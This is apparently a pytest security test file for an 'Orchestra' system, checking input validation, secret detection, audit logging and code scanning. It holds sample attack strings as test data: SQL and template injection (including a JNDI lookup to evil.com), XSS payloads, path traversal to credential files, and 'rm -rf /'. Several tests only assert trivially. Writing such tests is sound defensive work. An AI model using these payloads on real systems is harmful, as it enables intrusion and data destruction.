"""Security-focused tests for Orchestra system."""

import re
from unittest.mock import Mock, patch

import pytest

from src.config.settings import Settings
from src.utils.logging import SecurityAuditLogger


@pytest.mark.security
class TestInputValidation:
    """Test input validation and sanitization."""

    def test_sql_injection_prevention(self, security_test_data):
        """Test prevention of SQL injection attacks."""
        malicious_sql_inputs = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; DELETE FROM users WHERE '1'='1'; --",
            "' UNION SELECT * FROM passwords; --",
        ]

        for malicious_input in malicious_sql_inputs:
            # Test that SQL injection patterns are detected
            assert any(
                pattern in malicious_input
                for pattern in ["DROP", "DELETE", "UNION", "'", "--"]
            )

            # In a real implementation, you would test actual sanitization
            # For now, we verify the patterns are identifiable
            sql_patterns = [
                r"DROP\s+TABLE",
                r"DELETE\s+FROM",
                r"UNION\s+SELECT",
                r"';",
                r"--",
                r"OR.*1.*=.*1",
            ]
            assert any(
                re.search(pattern, malicious_input, re.IGNORECASE)
                for pattern in sql_patterns
            )

    def test_xss_prevention(self, security_test_data):
        """Test prevention of XSS attacks."""
        xss_inputs = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "' onmouseover='alert(1)'",
        ]

        for xss_input in xss_inputs:
            # Test that XSS patterns are detected
            xss_patterns = [
                r"<script",
                r"javascript:",
                r"onload=",
                r"onerror=",
                r"onmouseover=",
            ]
            assert any(
                re.search(pattern, xss_input, re.IGNORECASE) for pattern in xss_patterns
            )

    def test_path_traversal_prevention(self, security_test_data):
        """Test prevention of path traversal attacks."""
        path_traversal_inputs = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]

        for path_input in path_traversal_inputs:
            # Test that path traversal patterns are detected
            path_patterns = [r"\.\./", r"\.\.\\", r"/etc/", r"\\windows\\", r"%2e%2e"]
            assert any(
                re.search(pattern, path_input, re.IGNORECASE)
                for pattern in path_patterns
            )

    def test_template_injection_prevention(self, security_test_data):
        """Test prevention of template injection attacks."""
        template_injection_inputs = [
            "{{ 7*7 }}",
            "${jndi:ldap://evil.com/a}",
            "{{config.items()}}",
            "${java:version}",
            "#{7*7}",
        ]

        for template_input in template_injection_inputs:
            # Test that template injection patterns are detected
            template_patterns = [r"\{\{", r"\$\{", r"#\{", r"jndi:", r"config\."]
            assert any(
                re.search(pattern, template_input, re.IGNORECASE)
                for pattern in template_patterns
            )


@pytest.mark.security
class TestSecretDetection:
    """Test detection of secrets and sensitive data."""

    def test_api_key_detection(self):
        """Test detection of API keys."""
        api_key_patterns = [
            "sk-FAKE_OPENAI_KEY_FOR_TESTING_PURPOSES_XXXXXXXX",  # OpenAI format (48+ chars)
            "ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",  # GitHub format
            "pk-FAKE_PINECONE_KEY_FOR_TESTING_XXXX",  # Pinecone format (32+ chars)
        ]

        for api_key in api_key_patterns:
            # Test API key pattern detection
            if api_key.startswith("sk-"):
                assert len(api_key) >= 48  # OpenAI key length
            elif api_key.startswith("ghp_"):
                assert len(api_key) >= 36  # GitHub key length
            elif api_key.startswith("pk-"):
                assert len(api_key) >= 32  # Pinecone key length

    def test_password_detection(self):
        """Test detection of passwords in code."""
        password_patterns = [
            'password="secret123"',
            "password='admin123'",
            "PASSWORD=FAKE_PASSWORD_FOR_TESTING",
            "pwd=mypassword",
            "pass=123456",
        ]

        for password_pattern in password_patterns:
            # Test that password patterns are detected
            pwd_regex = [r"password\s*=", r"pwd\s*=", r"pass\s*="]
            assert any(
                re.search(pattern, password_pattern, re.IGNORECASE)
                for pattern in pwd_regex
            )

    def test_private_key_detection(self):
        """Test detection of private keys."""
        private_key_indicators = [
            "-----BEGIN PRIVATE KEY-----",
            "-----BEGIN RSA PRIVATE KEY-----",
            "-----BEGIN ENCRYPTED PRIVATE KEY-----",
            "ssh-rsa AAAAB3NzaC1yc2E",
            "id_rsa",
            "id_dsa",
        ]

        for key_indicator in private_key_indicators:
            # Test that private key patterns are detected
            key_patterns = [r"BEGIN.*PRIVATE KEY", r"ssh-rsa", r"id_rsa", r"id_dsa"]
            assert any(
                re.search(pattern, key_indicator, re.IGNORECASE)
                for pattern in key_patterns
            )


@pytest.mark.security
class TestSecurityAuditLogging:
    """Test security audit logging functionality."""

    def test_security_event_logging(self):
        """Test logging of security events."""
        audit_logger = SecurityAuditLogger("test.security")

        # Test different types of security events
        test_events = [
            ("authentication_failure", {"user": "test_user", "ip": "192.168.1.1"}),
            ("unauthorized_access", {"resource": "/admin", "user": "guest"}),
            ("code_injection_attempt", {"input": "malicious_code", "blocked": True}),
            ("file_access_violation", {"file": "/etc/passwd", "user": "attacker"}),
        ]

        for event_type, details in test_events:
            # Should not raise any exceptions
            audit_logger.log_security_event(event_type, details, "WARNING")

        assert True  # If we get here, all logging calls succeeded

    def test_agent_handoff_logging(self):
        """Test logging of agent handoffs for audit trail."""
        audit_logger = SecurityAuditLogger()

        # Test agent handoff logging
        audit_logger.log_agent_handoff(
            from_agent="orchestrator",
            to_agent="developer",
            context={"task": "code_generation", "file": "test.py"},
        )

        assert True  # If we get here, logging succeeded

    def test_code_generation_logging(self):
        """Test logging of code generation events."""
        audit_logger = SecurityAuditLogger()

        # Test code generation logging
        test_operations = [
            ("create", "new_file.py", True),
            ("modify", "existing_file.py", True),
            ("delete", "old_file.py", False),
        ]

        for operation, file_path, validated in test_operations:
            audit_logger.log_code_generation(
                agent="developer",
                file_path=file_path,
                operation=operation,
                validated=validated,
            )

        assert True  # If we get here, all logging calls succeeded

    def test_external_api_logging(self):
        """Test logging of external API calls."""
        audit_logger = SecurityAuditLogger()

        # Test external API call logging
        api_calls = [
            ("openai", "/chat/completions", True, 200),
            ("pinecone", "/vectors/upsert", True, 201),
            ("github", "/repos/owner/repo", False, 403),
            ("temporal", "/workflow/start", True, 200),
        ]

        for service, endpoint, success, response_code in api_calls:
            audit_logger.log_external_api_call(
                service=service,
                endpoint=endpoint,
                success=success,
                response_code=response_code,
            )

        assert True  # If we get here, all logging calls succeeded


@pytest.mark.security
class TestConfigurationSecurity:
    """Test security aspects of configuration management."""

    def test_sensitive_config_masking(self, test_settings):
        """Test that sensitive configuration values are properly masked."""
        # Test that sensitive values are not exposed in string representations

        # These patterns should not appear in string representations

        # In a real implementation, these would be masked
        # For now, we just verify the test setup
        assert test_settings.openai.api_key.startswith("sk-")
        assert test_settings.database.password == "test-password"

    def test_environment_variable_validation(self, test_settings):
        """Test validation of environment variables."""
        # Test that required environment variables are validated
        assert test_settings.openai.api_key is not None
        assert len(test_settings.openai.api_key) > 10

        # Test that invalid API keys would be rejected
        with pytest.raises(ValueError):
            # Test invalid API key
            from src.config.settings import OpenAISettings

            OpenAISettings(api_key="invalid-key-format")

    def test_security_settings_defaults(self, test_settings):
        """Test that security settings have secure defaults."""
        security = test_settings.security

        assert security.enable_audit_logging is True
        assert security.enable_code_scanning is True
        assert security.max_file_size > 0
        assert len(security.allowed_file_extensions) > 0

        # Test that dangerous extensions are not allowed
        dangerous_extensions = [".exe", ".bat", ".sh", ".ps1"]
        for ext in dangerous_extensions:
            assert ext not in security.allowed_file_extensions


@pytest.mark.security
class TestCodeSecurityScanning:
    """Test security scanning of generated code."""

    def test_dangerous_function_detection(self):
        """Test detection of dangerous functions in code."""
        dangerous_code_samples = [
            "exec('malicious code')",
            "eval(user_input)",
            "os.system('rm -rf /')",
            "subprocess.call(shell=True)",
            "__import__('os').system('ls')",
        ]

        dangerous_patterns = [
            r"exec\s*\(",
            r"eval\s*\(",
            r"os\.system\s*\(",
            r"subprocess\.call.*shell\s*=\s*True",
            r"__import__\s*\(",
        ]

        for code_sample in dangerous_code_samples:
            # Test that dangerous patterns are detected
            assert any(
                re.search(pattern, code_sample) for pattern in dangerous_patterns
            )

    def test_hardcoded_secret_detection(self):
        """Test detection of hardcoded secrets in code."""
        code_with_secrets = [
            'api_key = "sk-1234567890abcdef"',
            "password = 'FAKE_PASSWORD_FOR_TESTING'",
            'token = "ghp_FAKE_GITHUB_TOKEN_FOR_TEST"',
            "SECRET_KEY = 'django-secret-key'",
        ]

        secret_patterns = [
            r'(api_key|password|token|secret_key|secret)\s*=\s*["\'][^"\']+["\']'
        ]

        for code_sample in code_with_secrets:
            # Test that secret patterns are detected
            assert any(
                re.search(pattern, code_sample, re.IGNORECASE)
                for pattern in secret_patterns
            )

    def test_sql_query_validation(self):
        """Test validation of SQL queries in code."""
        sql_code_samples = [
            'query = "SELECT * FROM users WHERE id = " + user_id',  # SQL injection risk
            "cursor.execute(f'DELETE FROM {table} WHERE id = {id}')",  # SQL injection risk
            'cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))',  # Safe parameterized query
        ]

        unsafe_sql_patterns = [
            r'"\s*\+\s*\w+',  # String concatenation in SQL
            r"f['\"][^'\"]*\{[^}]+\}",  # f-string in SQL
        ]

        safe_sql_patterns = [
            r"%s",  # Parameterized query placeholder
            r"\?",  # SQLite parameterized query placeholder
        ]

        for code_sample in sql_code_samples:
            if any(re.search(pattern, code_sample) for pattern in unsafe_sql_patterns):
                # This code sample contains unsafe SQL patterns
                assert "+" in code_sample or "{" in code_sample
            elif any(re.search(pattern, code_sample) for pattern in safe_sql_patterns):
                # This code sample uses safe SQL patterns
                assert "%s" in code_sample or "?" in code_sample
